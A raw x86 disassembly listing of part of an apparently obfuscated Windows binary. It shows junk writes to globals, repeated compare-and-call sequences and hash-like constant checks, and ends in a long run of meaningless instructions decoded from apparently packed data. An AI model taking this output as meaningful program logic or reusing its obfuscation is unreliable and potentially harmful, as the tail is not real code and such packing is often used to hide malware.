  41ec9f:	mov    al,ds:0x42866e
  41eca4:	mov    DWORD PTR ds:0x428e35,0x7fda
  41ecae:	cmp    al,BYTE PTR ds:0x42867b
  41ecb4:	mov    DWORD PTR ds:0x428eb5,0x205
  41ecbe:	jne    0x41e428
  41ecc4:	mov    DWORD PTR ds:0x428ea9,0x1bc1
  41ecce:	mov    al,ds:0x428687
  41ecd3:	mov    DWORD PTR ds:0x428e31,0xcbc
  41ecdd:	cmp    al,BYTE PTR ds:0x428698
  41ece3:	jne    0x41e428
  41ece9:	xor    DWORD PTR ds:0x428e75,0x428e55
  41ecf3:	push   0x4286a1
  41ecf8:	push   0x4286ad
  41ecfd:	call   edi
  41ecff:	or     DWORD PTR ds:0x428eb9,0x1b73
  41ed09:	test   eax,eax
  41ed0b:	je     0x41e428
  41ed11:	mov    al,ds:0x4286be
  41ed16:	mov    DWORD PTR ds:0x428ebd,0x533
  41ed20:	cmp    al,BYTE PTR ds:0x4286cb
  41ed26:	mov    DWORD PTR ds:0x428eb1,0x6a19
  41ed30:	jne    0x41e428
  41ed36:	mov    DWORD PTR ds:0x428e79,0x3b4e
  41ed40:	mov    al,ds:0x4286d7
  41ed45:	mov    DWORD PTR ds:0x428e79,0x665f
  41ed4f:	cmp    al,BYTE PTR ds:0x4286e8
  41ed55:	jne    0x41e428
  41ed5b:	xor    DWORD PTR ds:0x428ead,0x43e0
  41ed65:	push   0x4286f1
  41ed6a:	push   0x4286fd
  41ed6f:	add    DWORD PTR ds:0x428eb1,0x428e79
  41ed79:	call   edi
  41ed7b:	and    DWORD PTR ds:0x428e7d,0x428e25
  41ed85:	test   eax,eax
  41ed87:	je     0x41e428
  41ed8d:	mov    al,ds:0x42870e
  41ed92:	mov    DWORD PTR ds:0x428e59,0x5b53
  41ed9c:	cmp    al,BYTE PTR ds:0x42871b
  41eda2:	jne    0x41e428
  41eda8:	mov    DWORD PTR ds:0x428e25,0x5848
  41edb2:	mov    al,ds:0x428727
  41edb7:	mov    DWORD PTR ds:0x428e75,0x6f79
  41edc1:	cmp    al,BYTE PTR ds:0x428738
  41edc7:	jne    0x41e428
  41edcd:	push   0x428741
  41edd2:	push   0x42874d
  41edd7:	call   edi
  41edd9:	sub    DWORD PTR ds:0x428e75,0x1f6e
  41ede3:	test   eax,eax
  41ede5:	je     0x41e428
  41edeb:	mov    al,ds:0x42875e
  41edf0:	mov    DWORD PTR ds:0x428ea9,0x6a75
  41edfa:	cmp    al,BYTE PTR ds:0x42876b
  41ee00:	mov    DWORD PTR ds:0x428e95,0x5296
  41ee0a:	jne    0x41e428
  41ee10:	mov    DWORD PTR ds:0x428e65,0x352f
  41ee1a:	mov    al,ds:0x428777
  41ee1f:	cmp    al,BYTE PTR ds:0x428788
  41ee25:	mov    DWORD PTR ds:0x428e39,0x65de
  41ee2f:	jne    0x41e428
  41ee35:	add    DWORD PTR ds:0x428ec5,0x39e0
  41ee3f:	push   0x428791
  41ee44:	sbb    DWORD PTR ds:0x428ec5,0x70eb
  41ee4e:	push   0x42879d
  41ee53:	add    DWORD PTR ds:0x428e75,0x6377
  41ee5d:	call   edi
  41ee5f:	test   eax,eax
  41ee61:	je     0x41e428
  41ee67:	mov    al,ds:0x4287ae
  41ee6c:	cmp    al,BYTE PTR ds:0x4287bb
  41ee72:	mov    DWORD PTR ds:0x428e75,0xc68
  41ee7c:	jne    0x41e428
  41ee82:	mov    DWORD PTR ds:0x428ea9,0x47d0
  41ee8c:	mov    al,ds:0x4287c7
  41ee91:	mov    DWORD PTR ds:0x428e35,0x2f08
  41ee9b:	cmp    al,BYTE PTR ds:0x4287d8
  41eea1:	mov    DWORD PTR ds:0x428e31,0x4709
  41eeab:	jne    0x41e428
  41eeb1:	sbb    DWORD PTR ds:0x428eb1,0x2bd9
  41eebb:	push   0x4287e1
  41eec0:	or     DWORD PTR ds:0x428e79,0x428ead
  41eeca:	push   0x4287ed
  41eecf:	adc    DWORD PTR ds:0x428ea1,0x22ee
  41eed9:	call   edi
  41eedb:	adc    DWORD PTR ds:0x428ecd,0x428ec5
  41eee5:	test   eax,eax
  41eee7:	mov    DWORD PTR ds:0x428e79,0x242c
  41eef1:	je     0x41e428
  41eef7:	mov    DWORD PTR ds:0x428e3d,0x326f
  41ef01:	mov    al,ds:0x4287fe
  41ef06:	mov    DWORD PTR ds:0x428eb9,0x8d5
  41ef10:	cmp    al,BYTE PTR ds:0x42880b
  41ef16:	mov    DWORD PTR ds:0x428e59,0x136
  41ef20:	jne    0x41e428
  41ef26:	mov    al,ds:0x428817
  41ef2b:	mov    DWORD PTR ds:0x428eb1,0x1632
  41ef35:	cmp    al,BYTE PTR ds:0x428828
  41ef3b:	mov    DWORD PTR ds:0x428e65,0x63ac
  41ef45:	jne    0x41e428
  41ef4b:	sub    DWORD PTR ds:0x428e59,0x428e31
  41ef55:	push   0x428831
  41ef5a:	push   0x42883d
  41ef5f:	mov    DWORD PTR ds:0x428e25,0x5d60
  41ef69:	call   edi
  41ef6b:	test   eax,eax
  41ef6d:	je     0x41e428
  41ef73:	mov    al,ds:0x42884e
  41ef78:	mov    DWORD PTR ds:0x428eb5,0x1dcb
  41ef82:	cmp    al,BYTE PTR ds:0x42885b
  41ef88:	mov    DWORD PTR ds:0x428eb5,0x40d0
  41ef92:	jne    0x41e428
  41ef98:	mov    al,ds:0x428867
  41ef9d:	mov    DWORD PTR ds:0x428ead,0x41e1
  41efa7:	cmp    al,BYTE PTR ds:0x428878
  41efad:	mov    DWORD PTR ds:0x428e31,0x6c07
  41efb7:	jne    0x41e428
  41efbd:	adc    DWORD PTR ds:0x428ea5,0x428ec9
  41efc7:	push   0x428881
  41efcc:	adc    DWORD PTR ds:0x428eb5,0x37c3
  41efd6:	push   0x42888d
  41efdb:	call   edi
  41efdd:	sub    DWORD PTR ds:0x428e31,0x47c0
  41efe7:	test   eax,eax
  41efe9:	mov    DWORD PTR ds:0x428e91,0x23ba
  41eff3:	je     0x41e428
  41eff9:	mov    DWORD PTR ds:0x428ea5,0x1cf7
  41f003:	mov    al,ds:0x42889e
  41f008:	mov    DWORD PTR ds:0x428e25,0x6ea3
  41f012:	cmp    al,BYTE PTR ds:0x4288ab
  41f018:	jne    0x41e428
  41f01e:	mov    DWORD PTR ds:0x428e95,0x9ed
  41f028:	mov    al,ds:0x4288b7
  41f02d:	mov    DWORD PTR ds:0x428e75,0x600
  41f037:	cmp    al,BYTE PTR ds:0x4288c8
  41f03d:	mov    DWORD PTR ds:0x428ead,0x4d3e
  41f047:	jne    0x41e428
  41f04d:	push   0x4288d1
  41f052:	push   0x4288dd
  41f057:	sbb    DWORD PTR ds:0x428ebd,0x717e
  41f061:	call   edi
  41f063:	sub    DWORD PTR ds:0x428e79,0x428e69
  41f06d:	test   eax,eax
  41f06f:	je     0x41e428
  41f075:	mov    al,ds:0x4288ee
  41f07a:	cmp    al,BYTE PTR ds:0x4288fb
  41f080:	jne    0x41e428
  41f086:	mov    al,ds:0x428907
  41f08b:	cmp    al,BYTE PTR ds:0x428918
  41f091:	jne    0x41e428
  41f097:	push   0x428921
  41f09c:	push   0x42892d
  41f0a1:	call   edi
  41f0a3:	test   eax,eax
  41f0a5:	je     0x41e428
  41f0ab:	mov    al,ds:0x42893e
  41f0b0:	cmp    al,BYTE PTR ds:0x42894b
  41f0b6:	jne    0x41e428
  41f0bc:	mov    al,ds:0x428957
  41f0c1:	cmp    al,BYTE PTR ds:0x428968
  41f0c7:	jne    0x41e428
  41f0cd:	push   0x428971
  41f0d2:	push   0x42897d
  41f0d7:	call   edi
  41f0d9:	test   eax,eax
  41f0db:	je     0x41e428
  41f0e1:	mov    al,ds:0x42898e
  41f0e6:	cmp    al,BYTE PTR ds:0x42899b
  41f0ec:	jne    0x41e428
  41f0f2:	mov    al,ds:0x4289a7
  41f0f7:	cmp    al,BYTE PTR ds:0x4289b8
  41f0fd:	jne    0x41e428
  41f103:	push   0x4289c1
  41f108:	push   0x4289cd
  41f10d:	call   edi
  41f10f:	test   eax,eax
  41f111:	je     0x41e428
  41f117:	mov    al,ds:0x4289de
  41f11c:	cmp    al,BYTE PTR ds:0x4289eb
  41f122:	jne    0x41e428
  41f128:	mov    al,ds:0x4289f7
  41f12d:	cmp    al,BYTE PTR ds:0x428a08
  41f133:	jne    0x41e428
  41f139:	push   0x428a11
  41f13e:	push   0x428a1d
  41f143:	call   edi
  41f145:	test   eax,eax
  41f147:	je     0x41e428
  41f14d:	mov    al,ds:0x428a2e
  41f152:	cmp    al,BYTE PTR ds:0x428a3b
  41f158:	jne    0x41e428
  41f15e:	mov    al,ds:0x428a47
  41f163:	cmp    al,BYTE PTR ds:0x428a58
  41f169:	jne    0x41e428
  41f16f:	push   0x428a61
  41f174:	push   0x428a6d
  41f179:	call   edi
  41f17b:	test   eax,eax
  41f17d:	je     0x41e428
  41f183:	mov    al,ds:0x428a7e
  41f188:	cmp    al,BYTE PTR ds:0x428a8b
  41f18e:	jne    0x41e428
  41f194:	mov    al,ds:0x428a97
  41f199:	cmp    al,BYTE PTR ds:0x428aa8
  41f19f:	jne    0x41e428
  41f1a5:	push   0x428ab1
  41f1aa:	push   0x428abd
  41f1af:	call   edi
  41f1b1:	test   eax,eax
  41f1b3:	je     0x41e428
  41f1b9:	mov    al,ds:0x428ace
  41f1be:	cmp    al,BYTE PTR ds:0x428adb
  41f1c4:	jne    0x41e428
  41f1ca:	mov    al,ds:0x428ae7
  41f1cf:	cmp    al,BYTE PTR ds:0x428af8
  41f1d5:	jne    0x41e428
  41f1db:	push   0x428b01
  41f1e0:	push   0x428b0d
  41f1e5:	call   edi
  41f1e7:	test   eax,eax
  41f1e9:	je     0x41e428
  41f1ef:	mov    al,ds:0x428b1e
  41f1f4:	cmp    al,BYTE PTR ds:0x428b2b
  41f1fa:	jne    0x41e428
  41f200:	mov    al,ds:0x428b37
  41f205:	cmp    al,BYTE PTR ds:0x428b48
  41f20b:	jne    0x41e428
  41f211:	push   0x428b51
  41f216:	push   0x428b5d
  41f21b:	call   edi
  41f21d:	test   eax,eax
  41f21f:	je     0x41e428
  41f225:	mov    al,ds:0x428b6e
  41f22a:	cmp    al,BYTE PTR ds:0x428b7b
  41f230:	jne    0x41e428
  41f236:	mov    al,ds:0x428b87
  41f23b:	cmp    al,BYTE PTR ds:0x428b98
  41f241:	jne    0x41e428
  41f247:	push   0x428ba1
  41f24c:	push   0x428bad
  41f251:	call   edi
  41f253:	test   eax,eax
  41f255:	je     0x41e428
  41f25b:	mov    al,ds:0x428bbe
  41f260:	cmp    al,BYTE PTR ds:0x428bcb
  41f266:	jne    0x41e428
  41f26c:	mov    al,ds:0x428bd7
  41f271:	cmp    al,BYTE PTR ds:0x428be8
  41f277:	jne    0x41e428
  41f27d:	push   0x428bf1
  41f282:	push   0x428bfd
  41f287:	call   edi
  41f289:	test   eax,eax
  41f28b:	je     0x41e428
  41f291:	mov    eax,DWORD PTR [esp+0x3c]
  41f295:	cmp    eax,0xf89c85b8
  41f29a:	je     0x41f2f9
  41f2a0:	mov    eax,DWORD PTR [esp+0x28]
  41f2a4:	mov    ecx,DWORD PTR [esp+0x38]
  41f2a8:	xor    eax,esi
  41f2aa:	add    eax,ebx
  41f2ac:	cmp    eax,ecx
  41f2ae:	je     0x41f2f9
  41f2b4:	mov    eax,ds:0x428365
  41f2b9:	mov    eax,DWORD PTR [eax+0x194]
  41f2bf:	mov    ecx,DWORD PTR [eax]
  41f2c1:	mov    eax,DWORD PTR [ecx+0x3c]
  41f2c4:	push   DWORD PTR ds:0x428445
  41f2ca:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  41f2ce:	push   DWORD PTR ds:0x4281e9
  41f2d4:	add    eax,ecx
  41f2d6:	mov    ecx,DWORD PTR ds:0x428365
  41f2dc:	mov    ecx,DWORD PTR [ecx+0x194]
  41f2e2:	push   DWORD PTR [ecx]
  41f2e4:	call   eax
  41f2e6:	mov    ecx,DWORD PTR ds:0x428365
  41f2ec:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41f2f2:	mov    DWORD PTR [ecx],eax
  41f2f4:	jmp    0x41f4f3
  41f2f9:	mov    eax,DWORD PTR [esp+0x28]
  41f2fd:	mov    ecx,DWORD PTR [esp+0x40]
  41f301:	xor    eax,esi
  41f303:	add    eax,ebx
  41f305:	cmp    eax,ecx
  41f307:	jne    0x41f372
  41f30d:	mov    eax,DWORD PTR [esp+0x28]
  41f311:	mov    ecx,DWORD PTR ds:0x428365
  41f317:	mov    ecx,DWORD PTR [ecx+0x198]
  41f31d:	xor    eax,esi
  41f31f:	add    eax,ebx
  41f321:	cmp    eax,DWORD PTR [ecx]
  41f323:	jne    0x41f34b
  41f329:	mov    eax,DWORD PTR [esp+0x28]
  41f32d:	push   0xffffffff
  41f32f:	push   0x70941f8a
  41f334:	xor    eax,esi
  41f336:	add    eax,ebx
  41f338:	push   eax
  41f339:	push   0xf89c85bd
  41f33e:	push   DWORD PTR [esp+0x1c]
  41f342:	push   DWORD PTR [esp+0x3c]
  41f346:	call   0x417181
  41f34b:	push   DWORD PTR [esp+0xc]
  41f34f:	push   DWORD PTR [esp+0x2c]
  41f353:	call   0x401000
  41f358:	mov    eax,DWORD PTR [esp+0x28]
  41f35c:	xor    eax,esi
  41f35e:	add    eax,ebx
  41f360:	mov    ds:0x4283f1,eax
  41f365:	mov    eax,DWORD PTR [esp+0x28]
  41f369:	xor    eax,esi
  41f36b:	add    eax,ebx
  41f36d:	mov    ds:0x4283e9,eax
  41f372:	mov    eax,DWORD PTR [esp+0x24]
  41f376:	test   eax,eax
  41f378:	je     0x41f4f3
  41f37e:	mov    DWORD PTR [esp+0x4c],0xf152c20
  41f386:	mov    DWORD PTR [esp+0x54],0x712edcf
  41f38e:	mov    DWORD PTR [esp+0x48],0x373fc11
  41f396:	mov    DWORD PTR [esp+0x50],0x72670ac1
  41f39e:	call   0x414ac6
  41f3a3:	mov    eax,DWORD PTR [esp+0x34]
  41f3a7:	mov    eax,DWORD PTR [esp+0xc]
  41f3ab:	mov    DWORD PTR [esp+0x30],eax
  41f3af:	mov    eax,DWORD PTR [esp+0x28]
  41f3b3:	mov    DWORD PTR [esp+0xc],eax
  41f3b7:	mov    eax,eax
  41f3b9:	mov    eax,ds:0x428365
  41f3be:	mov    ecx,DWORD PTR [eax+0x1c0]
  41f3c4:	mov    edx,DWORD PTR [ecx]
  41f3c6:	and    DWORD PTR [esp+0x14],0x0
  41f3cb:	mov    edi,0xfabdbecf
  41f3d0:	add    edx,edi
  41f3d2:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f3d7:	mov    ecx,0x8a29a145
  41f3dc:	xor    edx,ecx
  41f3de:	mov    DWORD PTR [esp+0x18],edx
  41f3e2:	mov    edx,DWORD PTR [esp+0x14]
  41f3e6:	xor    edx,0x0
  41f3e9:	cmp    DWORD PTR [esp+0x18],0x70941f95
  41f3f1:	mov    DWORD PTR [esp+0x1c],edx
  41f3f5:	jne    0x41f427
  41f3fb:	cmp    edx,0xffffffff
  41f3fe:	jne    0x41f427
  41f404:	mov    eax,ds:0x4283e9
  41f409:	mov    edx,DWORD PTR ds:0x4283f1
  41f40f:	xor    eax,edx
  41f411:	mov    ds:0x4283e9,eax
  41f416:	mov    edx,DWORD PTR ds:0x4283e9
  41f41c:	mov    eax,DWORD PTR [esp+0x24]
  41f420:	add    DWORD PTR [eax],edx
  41f422:	jmp    0x41f4b4
  41f427:	mov    eax,DWORD PTR [eax+0x1c8]
  41f42d:	mov    eax,DWORD PTR [eax]
  41f42f:	cdq    
  41f430:	add    eax,edi
  41f432:	adc    edx,0xffffffff
  41f435:	and    DWORD PTR [esp+0x14],0x0
  41f43a:	xor    edx,0x0
  41f43d:	mov    DWORD PTR [esp+0x2c],edx
  41f441:	mov    edx,DWORD PTR [esp+0xc]
  41f445:	mov    DWORD PTR [esp+0x10],edx
  41f449:	xor    eax,ecx
  41f44b:	add    DWORD PTR [esp+0x10],edi
  41f44f:	mov    edx,DWORD PTR [esp+0x10]
  41f453:	adc    DWORD PTR [esp+0x14],0xffffffff
  41f458:	xor    edx,ecx
  41f45a:	mov    DWORD PTR [esp+0x18],edx
  41f45e:	mov    edx,DWORD PTR [esp+0x14]
  41f462:	xor    edx,0x0
  41f465:	mov    DWORD PTR [esp+0x1c],edx
  41f469:	cmp    DWORD PTR [esp+0x18],eax
  41f46d:	jne    0x41f47f
  41f473:	mov    eax,DWORD PTR [esp+0x2c]
  41f477:	cmp    edx,eax
  41f479:	je     0x41f490
  41f47f:	mov    eax,DWORD PTR [esp+0xc]
  41f483:	add    eax,DWORD PTR [esp+0x30]
  41f487:	mov    DWORD PTR [esp+0xc],eax
  41f48b:	jmp    0x41f4f3
  41f490:	mov    eax,ds:0x4283e9
  41f495:	mov    edx,DWORD PTR ds:0x4283f1
  41f49b:	xor    eax,edx
  41f49d:	mov    ds:0x4283e9,eax
  41f4a2:	mov    eax,DWORD PTR [esp+0x24]
  41f4a6:	mov    edx,DWORD PTR ds:0x4283e9
  41f4ac:	add    edx,DWORD PTR [eax]
  41f4ae:	mov    eax,DWORD PTR [esp+0x24]
  41f4b2:	mov    DWORD PTR [eax],edx
  41f4b4:	mov    edx,DWORD PTR [esp+0xc]
  41f4b8:	mov    eax,ds:0x4283e9
  41f4bd:	xor    edx,esi
  41f4bf:	add    edx,ebx
  41f4c1:	xor    ebx,ebx
  41f4c3:	add    edx,edi
  41f4c5:	adc    ebx,0xffffffff
  41f4c8:	xor    esi,esi
  41f4ca:	xor    edx,ecx
  41f4cc:	xor    ebx,0x0
  41f4cf:	add    eax,edi
  41f4d1:	adc    esi,0xffffffff
  41f4d4:	xor    eax,ecx
  41f4d6:	xor    esi,0x0
  41f4d9:	cmp    eax,edx
  41f4db:	jne    0x41f4f3
  41f4e1:	cmp    esi,ebx
  41f4e3:	jne    0x41f4f3
  41f4e9:	mov    eax,ds:0x4283e9
  41f4ee:	mov    ds:0x4283f1,eax
  41f4f3:	mov    eax,ds:0x428365
  41f4f8:	push   0x4
  41f4fa:	add    eax,0x1cc
  41f4ff:	push   eax
  41f500:	lea    eax,[esp+0x3c]
  41f504:	push   eax
  41f505:	call   0x41f519
  41f50a:	mov    eax,DWORD PTR [esp+0x34]
  41f50e:	mov    eax,DWORD PTR [eax]
  41f510:	pop    edi
  41f511:	pop    esi
  41f512:	pop    ebx
  41f513:	mov    esp,ebp
  41f515:	pop    ebp
  41f516:	ret    0xc
  41f519:	push   ebp
  41f51a:	mov    ebp,esp
  41f51c:	sub    esp,0x10
  41f51f:	mov    DWORD PTR ds:0x428e69,0x19
  41f529:	cmp    DWORD PTR ds:0x428e69,0x0
  41f530:	je     0x41f565
  41f536:	cmp    DWORD PTR ds:0x428e69,0x1f
  41f53d:	jge    0x41f565
  41f543:	jmp    0x41f553
  41f548:	push   0x4280ab
  41f54d:	call   DWORD PTR ds:0x42ca30
  41f553:	mov    edx,DWORD PTR ds:0x428e69
  41f559:	dec    edx
  41f55a:	mov    DWORD PTR ds:0x428e69,edx
  41f560:	jmp    0x41f529
  41f565:	mov    eax,0xf89c85b9
  41f56a:	mov    DWORD PTR [ebp-0x4],eax
  41f56d:	or     ecx,edx
  41f56f:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  41f576:	sbb    DWORD PTR ds:0x428e35,ecx
  41f57c:	mov    ecx,DWORD PTR [ebp-0x4]
  41f57f:	sbb    DWORD PTR ds:0x428e95,edi
  41f585:	push   esi
  41f586:	mov    edx,0x75108b1
  41f58b:	inc    DWORD PTR ds:0x428e49
  41f591:	xor    ecx,edx
  41f593:	sub    DWORD PTR ds:0x428ed1,edx
  41f599:	mov    esi,0x3272f8
  41f59e:	adc    DWORD PTR ds:0x428e41,0x428e31
  41f5a8:	push   edi
  41f5a9:	mov    edi,DWORD PTR [ebp+0x10]
  41f5ac:	xor    DWORD PTR ds:0x428e7d,0x428e91
  41f5b6:	add    ecx,esi
  41f5b8:	mov    DWORD PTR ds:0x428e59,0x285e
  41f5c2:	cmp    ecx,edi
  41f5c4:	je     0x423f13
  41f5ca:	and    DWORD PTR ds:0x428ec9,0x0
  41f5d4:	xor    ecx,ecx
  41f5d6:	add    ecx,DWORD PTR ds:0x428ec9
  41f5dc:	inc    ecx
  41f5dd:	mov    DWORD PTR ds:0x428ec9,ecx
  41f5e3:	cmp    DWORD PTR ds:0x428ec9,0x4
  41f5ea:	ja     0x41f629
  41f5f0:	jmp    0x41f600
  41f5f5:	push   0x5d76
  41f5fa:	call   DWORD PTR ds:0x42ca38
  41f600:	cmp    DWORD PTR ds:0x428ec9,0x3
  41f607:	jne    0x41f61c
  41f60d:	xor    ecx,ecx
  41f60f:	or     ecx,DWORD PTR ds:0x428ec9
  41f615:	inc    ecx
  41f616:	mov    DWORD PTR ds:0x428ec9,ecx
  41f61c:	cmp    DWORD PTR ds:0x428ec9,0x1c
  41f623:	jb     0x41f5d4
  41f629:	mov    ecx,DWORD PTR [ebp-0x4]
  41f62c:	xor    edi,edi
  41f62e:	xor    edi,DWORD PTR ds:0x428e39
  41f634:	or     DWORD PTR ds:0x428e25,edi
  41f63a:	mov    edi,DWORD PTR [ebp+0x10]
  41f63d:	and    DWORD PTR ds:0x428e55,0x428e29
  41f647:	xor    eax,eax
  41f649:	add    DWORD PTR ds:0x428e91,0x4be1
  41f653:	xor    ecx,edx
  41f655:	adc    DWORD PTR ds:0x428e81,0x428e69
  41f65f:	add    ecx,esi
  41f661:	add    edi,0xfabdbecf
  41f667:	adc    eax,0xffffffff
  41f66a:	and    DWORD PTR ds:0x428e39,0x428ec1
  41f674:	xor    eax,0x0
  41f677:	xor    DWORD PTR ds:0x428e75,0x428e29
  41f681:	mov    DWORD PTR [ebp-0xc],eax
  41f684:	push   ebx
  41f685:	xor    ebx,ebx
  41f687:	and    DWORD PTR ds:0x428ea1,0x0
  41f691:	jmp    0x41f6a4
  41f696:	xor    eax,eax
  41f698:	xor    eax,DWORD PTR ds:0x428ea1
  41f69e:	inc    eax
  41f69f:	mov    ds:0x428ea1,eax
  41f6a4:	cmp    DWORD PTR ds:0x428ea1,0x14
  41f6ab:	jae    0x41f6f4
  41f6b1:	cmp    DWORD PTR ds:0x428ea1,0xa
  41f6b8:	jle    0x41f6f4
  41f6be:	jmp    0x41f6d7
  41f6c3:	push   DWORD PTR [ebp-0x14]
  41f6c6:	push   DWORD PTR [ebp-0xc]
  41f6c9:	push   0x22e9
  41f6ce:	push   DWORD PTR [ebp-0x18]
  41f6d1:	call   DWORD PTR ds:0x42ca3c
  41f6d7:	cmp    DWORD PTR ds:0x428ea1,0x9
  41f6de:	jne    0x41f6ef
  41f6e4:	mov    eax,ds:0x428ea1
  41f6e9:	inc    eax
  41f6ea:	mov    ds:0x428ea1,eax
  41f6ef:	jmp    0x41f696
  41f6f4:	xor    edi,0x8a29a145
  41f6fa:	mov    eax,ecx
  41f6fc:	add    eax,0xfabdbecf
  41f701:	adc    ebx,0xffffffff
  41f704:	xor    eax,0x8a29a145
  41f709:	xor    ebx,0x0
  41f70c:	cmp    eax,edi
  41f70e:	jmp    0x421acd
  41f713:	pop    ebx
  41f714:	popf   
  41f715:	cwde   
  41f716:	jo     0x41f772
  41f718:	jp     0x41f77d
  41f71a:	mov    dl,0xe1
  41f71c:	cmp    eax,0x7e960de9
  41f721:	jmp    0x41f6d7
  41f723:	and    DWORD PTR [esp+edi*2],0x7b9e1d7b
  41f72a:	jnp    0x41f725
  41f72c:	shl    DWORD PTR [edx-0x6d77d6f3],1
  41f732:	pop    gs
  41f734:	mov    WORD PTR [ebx],ds
  41f736:	popf   
  41f737:	sbb    ah,BYTE PTR [edx-0x57312397]
  41f73d:	lds    edi,FWORD PTR ds:0xf3e3a2c1
  41f743:	pop    es
  41f744:	sbb    ch,bl
  41f746:	lods   eax,DWORD PTR ds:[esi]
  41f747:	jb     0x41f76e
  41f749:	inc    eax
  41f74a:	pop    ss
  41f74b:	mov    dl,0x34
  41f74d:	jns    0x41f73d
  41f74f:	scas   al,BYTE PTR es:[edi]
  41f750:	mov    dh,0x9f
  41f752:	mov    ch,0x2e
  41f754:	mov    ecx,0xc404ea6e
  41f759:	adc    eax,0x297f4b56
  41f75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f75f:	jbe    0x41f721
  41f761:	xor    eax,0xa425b6fb
  41f766:	adc    al,ah
  41f768:	add    BYTE PTR [eax+0x6d],cl
  41f76b:	jle    0x41f71e
  41f76d:	inc    eax
  41f76e:	sbb    DWORD PTR [ecx],0x6983d672
  41f774:	lahf   
  41f775:	jne    0x41f741
  41f777:	in     eax,dx
  41f778:	stc    
  41f779:	mov    eax,ds:0x8faab925
  41f77e:	and    bh,BYTE PTR [eax]
  41f780:	or     DWORD PTR [eax-0x2c74327c],esi
  41f786:	bound  edx,QWORD PTR gs:[ecx+ebp*1-0x44]
  41f78b:	clc    
  41f78c:	out    dx,al
  41f78d:	or     eax,0x8e63a524
  41f792:	inc    edi
  41f793:	lods   al,BYTE PTR ds:[esi]
  41f794:	mov    eax,ds:0xea354423
  41f799:	xor    al,0x97
  41f79b:	cdq    
  41f79c:	pop    es
  41f79d:	xor    eax,0xee024f17
  41f7a2:	lods   eax,DWORD PTR ds:[esi]
  41f7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7a4:	sub    ebx,esp
  41f7a6:	inc    eax
  41f7a7:	dec    ecx
  41f7a8:	mov    al,ds:0xf5f59553
  41f7ad:	cmp    BYTE PTR [esp+ebx*4],0xa9
  41f7b1:	xchg   DWORD PTR [esi],edi
  41f7b3:	add    BYTE PTR [eax-0x1a],bl
  41f7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7b7:	test   DWORD PTR [ebp-0xf],edi
  41f7ba:	(bad)  
  41f7bb:	ret    
  41f7bc:	loope  0x41f7ec
  41f7be:	inc    esi
  41f7bf:	adc    al,0xc1
  41f7c1:	and    eax,0x569d4ec7
  41f7c6:	(bad)  
  41f7c7:	cs dec edi
  41f7c9:	xchg   ecx,eax
  41f7ca:	jno    0x41f79b
  41f7cc:	fsubr  st,st(0)
  41f7ce:	inc    esp
  41f7cf:	fcmove st,st(2)
  41f7d1:	xchg   ecx,eax
  41f7d2:	jl     0x41f843
  41f7d4:	jp     0x41f838
  41f7d6:	out    0x11,al
  41f7d8:	les    ebx,FWORD PTR [ebx]
  41f7da:	ins    DWORD PTR es:[edi],dx
  41f7db:	xlat   BYTE PTR ds:[ebx]
  41f7dc:	or     al,BYTE PTR [eax-0x18]
  41f7df:	push   edx
  41f7e0:	push   esp
  41f7e1:	mov    ds:0x976900e4,eax
  41f7e6:	dec    eax
  41f7e7:	call   0xc95985
  41f7ec:	xchg   ecx,eax
  41f7ed:	sbb    cl,BYTE PTR [edi+0x5485b9d9]
  41f7f3:	(bad)  [ebx+0x5d]
  41f7f6:	loope  0x41f7bd
  41f7f8:	xchg   esi,eax
  41f7f9:	jno    0x41f7e8
  41f7fb:	xchg   ebx,eax
  41f7fc:	cld    
  41f7fd:	(bad)  
  41f7fe:	cmp    al,0x76
  41f800:	push   edx
  41f801:	inc    ebp
  41f802:	in     al,0x35
  41f804:	loop   0x41f7d6
  41f806:	push   ecx
  41f807:	jae    0x41f867
  41f809:	xor    BYTE PTR [edi-0x5e],cl
  41f80c:	out    0x95,eax
  41f80e:	jg     0x41f7a4
  41f810:	push   ebx
  41f811:	cmp    DWORD PTR [eax],esp
  41f813:	cld    
  41f814:	sar    bl,cl
  41f816:	popf   
  41f817:	loope  0x41f81c
  41f819:	cmc    
  41f81a:	mov    ecx,0x5ca09a37
  41f81f:	int3   
  41f820:	loop   0x41f89a
  41f822:	and    eax,0x46f5d1a5
  41f827:	push   es
  41f828:	mov    BYTE PTR [edx+0x53d4a47a],bh
  41f82e:	jecxz  0x41f87f
  41f830:	es mov edx,0x92735172
  41f836:	jle    0x41f82d
  41f838:	pop    esi
  41f839:	push   ds
  41f83a:	push   ebx
  41f83b:	das    
  41f83c:	cmp    BYTE PTR [ebp-0x32],dl
  41f83f:	or     al,dl
  41f841:	mov    dl,ah
  41f843:	pop    ecx
  41f844:	rcr    BYTE PTR [ebx+0x7bb1fba7],cl
  41f84a:	out    dx,eax
  41f84b:	lods   al,BYTE PTR ds:[esi]
  41f84c:	jae    0x41f86a
  41f84e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f84f:	retf   
  41f850:	fdiv   DWORD PTR gs:[edx]
  41f853:	dec    eax
  41f854:	mov    eax,ds:0xb70b86be
  41f859:	mov    eax,ds:0x8c05b1c9
  41f85e:	lahf   
  41f85f:	shl    BYTE PTR [ebx+0xdc7071b],0x63
  41f866:	lds    edx,FWORD PTR [esp+ebp*1-0x65]
  41f86a:	and    esp,DWORD PTR [ebx]
  41f86c:	xor    BYTE PTR [ebp+0x5f158fa7],ch
  41f872:	repnz or cl,ch
  41f875:	adc    al,0xff
  41f877:	cli    
  41f878:	add    DWORD PTR [ecx],esp
  41f87a:	cli    
  41f87b:	mov    ebp,0x70600251
  41f880:	xchg   ecx,eax
  41f881:	fs into 
  41f883:	inc    ebx
  41f884:	jne    0x41f85f
  41f886:	(bad)  
  41f887:	cmp    DWORD PTR [ebx-0x16],esp
  41f88a:	iret   
  41f88b:	pop    eax
  41f88c:	inc    edx
  41f88d:	pop    es
  41f88e:	cmp    eax,ebx
  41f890:	dec    edx
  41f891:	ficom  DWORD PTR [edi+0x6f]
  41f894:	mov    eax,0x52d0b1c9
  41f899:	fldenv [edx+ebp*4]
  41f89c:	or     ch,bh
  41f89e:	or     BYTE PTR [edx+edi*4],bl
  41f8a1:	push   ebp
  41f8a2:	dec    edx
  41f8a3:	lahf   
